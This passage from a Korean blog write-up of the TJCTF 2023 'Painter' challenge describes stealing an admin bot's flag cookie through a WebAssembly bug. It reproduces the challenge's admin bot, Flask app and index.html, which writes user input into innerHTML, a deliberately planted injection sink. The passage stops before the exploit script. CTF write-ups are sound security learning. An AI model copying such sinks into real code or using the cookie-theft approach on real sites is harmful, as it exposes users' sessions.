+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      TJCTF 2023 - Painter
+    </h1>
+    <div class="post-meta">
+
+
+May 2023
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#painter" aria-label="painter">painter</a><ul>
+                        
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
+                        
+                <li>
+                    <a href="#admin-botjs" aria-label="admin-bot.js">admin-bot.js</a></li>
+                <li>
+                    <a href="#dockerfile" aria-label="Dockerfile">Dockerfile</a></li>
+                <li>
+                    <a href="#apppy" aria-label="app.py">app.py</a></li>
+                <li>
+                    <a href="#indexhtml" aria-label="index.html">index.html</a></li>
+                <li>
+                    <a href="#indexjs" aria-label="index.js">index.js</a></li>
+                <li>
+                    <a href="#indexwasm" aria-label="index.wasm">index.wasm</a><ul>
+                        
+                <li>
+                    <a href="#setname" aria-label="setName()">setName()</a></li>
+                <li>
+                    <a href="#copycanvas" aria-label="copyCanvas()">copyCanvas()</a></li>
+                <li>
+                    <a href="#getlayer" aria-label="getLayer()">getLayer()</a></li>
+                <li>
+                    <a href="#main" aria-label="main()">main()</a></li>
+                <li>
+                    <a href="#func13" aria-label="func13()">func13()</a></li>
+                <li>
+                    <a href="#loop" aria-label="loop()">loop()</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="painter">painter<a hidden class="anchor" aria-hidden="true" href="#painter">#</a></h1>
+<p><img loading="lazy" src="/blog/TJCTF_2023_Painter/image.png" alt=""  />
+<br>
+유사 그림판 컨셉인듯 하다.<br>
+Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.<br>
+Wasm 취약점 분석은 처음 해봐서 생소했다.<br>
+admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.</p>
+<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
+<h3 id="admin-botjs">admin-bot.js<a hidden class="anchor" aria-hidden="true" href="#admin-botjs">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flag</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;./flag.txt&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">time</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">time</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">default</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;painter&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;painter&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">urlRegex</span><span style="color:#f92672">:</span> <span style="color:#e6db74">/^https:\/\/painter\.tjc\.tf\//</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10000</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">handler</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">ctx</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#39;https://painter.tjc.tf&#39;</span>, { <span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;domcontentloaded&#39;</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;flag&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">trim</span>(),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;painter.tjc.tf&#39;</span>,
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">url</span>, { <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10000</span>, <span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;domcontentloaded&#39;</span> });
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">10000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p><img loading="lazy" src="/blog/TJCTF_2023_Painter/image-1.png" alt=""  />
+<br>
+admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다.<br>
+쿠키에 flag가 들어있다.<br>
+쿠키 탈취가 목적이다.</p>
+<h3 id="dockerfile">Dockerfile<a hidden class="anchor" aria-hidden="true" href="#dockerfile">#</a></h3>
+<pre tabindex="0"><code>FROM python:3.8.5-slim-buster
+
+RUN pip install flask gunicorn
+WORKDIR /app
+COPY . .
+
+EXPOSE 5000
+
+ENTRYPOINT [&#34;gunicorn&#34;, &#34;-b&#34;, &#34;0.0.0.0:5000&#34;, &#34;-t&#34;, &#34;4&#34;, &#34;app:app&#34;]
+</code></pre><h3 id="apppy">app.py<a hidden class="anchor" aria-hidden="true" href="#apppy">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, redirect, request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> uuid <span style="color:#f92672">import</span> uuid4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>images <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/save&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_image</span>():
+</span></span><span style="display:flex;"><span>    img, name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;img&#39;</span>], request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;name&#39;</span>]
+</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> uuid4()
+</span></span><span style="display:flex;"><span>    images[id] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;img&#39;</span>: img,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;name&#39;</span>: name
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/img/&#39;</span> <span style="color:#f92672">+</span> str(id))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/img/&lt;uuid:id&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">image_id</span>(id):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> id <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> images:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> images[id][<span style="color:#e6db74">&#39;img&#39;</span>]
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> images[id][<span style="color:#e6db74">&#39;name&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, px<span style="color:#f92672">=</span>img, name<span style="color:#f92672">=</span>name, saved<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>이미지를 저장하거나 볼 수 있는 것 같다.</p>
+<h3 id="indexhtml">index.html<a hidden class="anchor" aria-hidden="true" href="#indexhtml">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html; charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">body</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">height</span>: <span style="color:#ae81ff">100</span><span style="color:#66d9ef">vh</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">width</span>: <span style="color:#ae81ff">100</span><span style="color:#66d9ef">%</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">margin</span>: <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">display</span>: <span style="color:#66d9ef">grid</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">justify-items</span>: <span style="color:#66d9ef">center</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">align-items</span>: <span style="color:#66d9ef">center</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">text-align</span>: <span style="color:#66d9ef">left</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        #options {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">display</span>: <span style="color:#66d9ef">flex</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">flex-direction</span>: <span style="color:#66d9ef">row</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">justify-content</span>: <span style="color:#66d9ef">space-between</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        #canvas {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">border</span>: <span style="color:#ae81ff">1</span><span style="color:#66d9ef">px</span> <span style="color:#66d9ef">solid</span> <span style="color:#66d9ef">black</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">height</span>: <span style="color:#ae81ff">75</span><span style="color:#66d9ef">vh</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">max-height</span>: <span style="color:#ae81ff">1000</span><span style="color:#66d9ef">px</span>;
+</span></span><span style="display:flex;"><span>            image-rendering: <span style="color:#66d9ef">pixelated</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name-h1&#34;</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">canvas</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;canvas&#34;</span> <span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span>&gt;&lt;/<span style="color:#f92672">canvas</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color-picker&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">select</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;layers&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;Top Layer&lt;/<span style="color:#f92672">option</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;Middle Layer&lt;/<span style="color:#f92672">option</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;Bottom Layer&lt;/<span style="color:#f92672">option</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">select</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Name&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;save&#34;</span>&gt;Save&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">canvas</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;canvas&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Module</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">canvas</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">canvas</span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;keydown&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stopImmediatePropagation</span>();
+</span></span><span style="display:flex;"><span>        }, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;keyup&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stopImmediatePropagation</span>();
+</span></span><span style="display:flex;"><span>        }, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">strToCharArr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">str</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_malloc</span>(<span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">stringToUTF8</span>(<span style="color:#a6e22e">str</span>, <span style="color:#a6e22e">ptr</span>, <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ptr</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base64ToArr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">enc</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">binary</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">enc</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bytes</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">binary</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">bytes</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">binary</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">bytes</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">arrToCharArr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">arr</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_malloc</span>(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">writeArrayToMemory</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">ptr</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ptr</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">setName</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">UTF8ToString</span>(<span style="color:#a6e22e">_getName</span>());
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;name-h1&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">onRuntimeInitialized</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_clearCanvas</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">saved</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">px</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ px }}&#39;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ name }}&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_clearCanvas</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64ToArr</span>(<span style="color:#a6e22e">px</span>); <span style="color:#75715e">// get img binary
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arrToCharArr</span>(<span style="color:#a6e22e">bin</span>); 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_copyCanvas</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">bin</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_setName</span>(<span style="color:#a6e22e">strToCharArr</span>(<span style="color:#a6e22e">name</span>), <span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            {<span style="color:#f92672">%</span> <span style="color:#a6e22e">endif</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;mousemove&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rect</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">getBoundingClientRect</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">scale</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">rect</span>.<span style="color:#a6e22e">width</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_draw</span>((<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">clientX</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">rect</span>.<span style="color:#a6e22e">left</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">scale</span>, (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">clientY</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">rect</span>.<span style="color:#a6e22e">top</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">scale</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;mousedown&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_toggleLeftMouseButton</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;mouseup&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_toggleLeftMouseButton</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;color-picker&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;input&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/[0-9a-fA-F]{2}/g</span>).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">v</span> =&gt; parseInt(<span style="color:#a6e22e">v</span>, <span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_setColor</span>(...<span style="color:#a6e22e">c</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
